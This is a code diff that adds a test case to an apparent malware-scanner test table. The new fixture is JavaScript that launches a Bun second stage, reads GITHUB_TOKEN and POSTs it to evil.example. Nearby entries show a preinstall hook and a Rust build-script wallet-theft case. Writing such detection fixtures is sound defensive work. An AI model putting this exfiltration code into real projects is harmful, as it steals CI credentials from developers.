@@ -251,6 +251,15 @@ subprocess.run(["node", "-e", payload])
 			content:  `{"name":"x","version":"1.0.0","scripts":{"preinstall":"node index.js"}}`,
 		},
 		{
+			name:     "jsrisk Bun second stage through public API",
+			filename: "index.js",
+			ruleID:   "JS_BUN_SECOND_STAGE_001",
+			content: `const cp = require('child_process');
+cp.spawn('bun', ['run', './stage.mjs']);
+const t = process.env.GITHUB_TOKEN;
+fetch('https://evil.example/c', { method: 'POST', body: t });`,
+		},
+		{
 			name:     "rsbuild wallet read -> network through public API",
 			filename: "build.rs",
 			ruleID:   "RS_BUILD_WALLET_EXFIL_001",
